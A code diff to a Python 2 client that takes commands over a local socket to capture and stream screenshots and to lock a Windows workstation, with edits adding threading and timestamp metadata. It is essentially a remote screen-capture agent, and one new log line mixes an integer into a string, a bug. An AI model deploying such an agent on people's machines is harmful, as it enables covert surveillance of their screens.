@@ -7,6 +7,8 @@ import uuid
 import os
 import base64
 import ctypes
+import threading
+import datetime
 
 global userid
 
@@ -23,18 +25,25 @@ def lockscreen_handler():
 	ctypes.windll.user32.LockWorkStation()
 	return
 
+
 def snap_handler(userid):
+	log('started snap handler')
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect(("127.0.0.1", 10000))
+	snapid = 0
+	image_timestamp = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M")
+	image_date = image_timestamp.split('T')[0]
+	image_hour = image_timestamp.split('T')[1].split(":")[0]
+	image_minute = image_timestamp.split('T')[1].split(":")[1]
 	for i in xrange(100):
 		log('Getting snap num {0}'.format(i))
-		snapshot = ImageGrab.grab()
+		snapshot = ImageGrab.grab() # TODO Lower quality
 		save_path = "C:\\Users\\user\\MySnapshot.jpg"
 		snapshot.save(save_path)
-		snapid = str(uuid.uuid4())
 		log('got snap, snapid: ' + snapid)
 		# Send
 		f = open(save_path, 'rb')
+
 		while True:
 			log('Reading from snap')
 			raw_data = f.read(500000)
@@ -42,7 +51,7 @@ def snap_handler(userid):
 				log('breaking')
 				break
 			encoded_data = base64.b64encode(raw_data)
-			msg = "{0},{1},{2}".format(userid, snapid, encoded_data)
+			msg = "{0},{1},{2},{3},{4},{5}".format(userid, image_date, image_hour, image_minute, snapid, encoded_data)
 			s.send(msg)
 			time.sleep(0.1)
 			log('Sent snap')
@@ -51,13 +60,25 @@ def snap_handler(userid):
 		f.close()
 		os.remove(save_path)
 
+		# Check for new variables for the next file
+		image_new_timestamp = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M")
+		if image_new_timestamp != image_timestamp:
+			image_timestamp = image_new_timestamp
+			image_date = image_timestamp.split('T')[0]
+			image_hour = image_timestamp.split('T')[1].split(":")[0]
+			image_minute = image_timestamp.split('T')[1].split(":")[1]
+			snapid = 0
+		else:
+			snapid += 1
+
+
 
 def main():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect(("127.0.0.1", 8002))
 	log('connected')
 	userid = random.randint(1,10001)
-	log('userid' + str(userid))
+	log('userid ' + str(userid))
 	s.send(str(userid))
 	s.recv(1024)
 	log('before while')
@@ -69,7 +90,7 @@ def main():
 		req = s.recv(1024)
 		print 'Do request: ' + req
 		if req == 'snap':
-			threading.thread(target=snap_handler, args=(userid,))
+			threading.Thread(target=snap_handler, args=(userid,)).start()
 		if req == 'lockscreen':
 			lockscreen_handler()
 		elif req == 'nojobs':
